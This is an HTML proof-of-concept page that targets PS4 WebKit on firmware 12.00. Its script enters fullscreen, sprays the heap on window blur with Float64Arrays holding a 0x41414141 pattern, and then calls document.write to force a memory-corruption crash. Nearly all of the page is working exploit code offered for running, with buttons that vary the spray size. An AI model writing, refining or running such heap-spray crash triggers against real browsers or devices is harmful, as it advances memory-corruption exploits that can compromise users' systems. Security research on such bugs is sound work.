
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Webkit (PoC CE-36329-3)</title>
</head>
<body>

    <h1>WebKit Memory Corruption - Stability Test</h1>
    <p>Target: Firmware 12.00 | Researcher: Leandro</p>
    
    <div id="msg">
        INSTRUCTIONS:<br>
        1. Click a button below to enter Fullscreen.<br>
        2. Press <b>OPTIONS</b> on the controller.<br>
        3. The document.write will trigger the crash.
    </div>
    
    <br>
    <button onclick="fire(1)">RUN TEST 1</button>
    <button onclick="fire(2)">RUN TEST 2</button>
    <button onclick="fire(3)">RUN TEST 3</button>
    <button onclick="fire(4)">RUN TEST 4</button>
    <button onclick="fire(5)">RUN TEST 5</button>
    <button onclick="fire(6)">RUN TEST 6</button>

    <script>
        const Msg = document.getElementById('msg');
        let spray_storage = [];
        // O valor que representa 0x4141414141414141 em memória
        const PATTERN = 2.121995791e-314; 

        function fire(type) {
            Msg.innerText = "FULLSCREEN ACTIVE - PRESS OPTIONS NOW"; 
            
            // Entrada em Fullscreen idêntica ao seu código
            const doc = document.documentElement;
            if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();

            // O GATILHO: Exatamente como você explicou
            window.onblur = function() {
                // 1. FREE/CORRUPT
                // Variamos apenas a intensidade do spray conforme o botão
                let spray_size = 8000 + (type * 1000); 
                
                try {
                    for(let i = 0; i < spray_size; i++) {
                        // Replicando o uso do Float64Array que corrompe a memória
                        const poison = new Float64Array(32);
                        poison.fill(PATTERN); 
                        spray_storage.push(poison);
                    }
                } catch(e) {}
                
                // 2. TEARDOWN (O que causa o crash ao apertar Options)
                // Usando document.write para interromper o contexto em Fullscreen
                document.open();
                document.write("<html><body><h1>CRASHING...</h1></body></html>");
                document.close();
            };
        }
    </script>
</body>
</html>
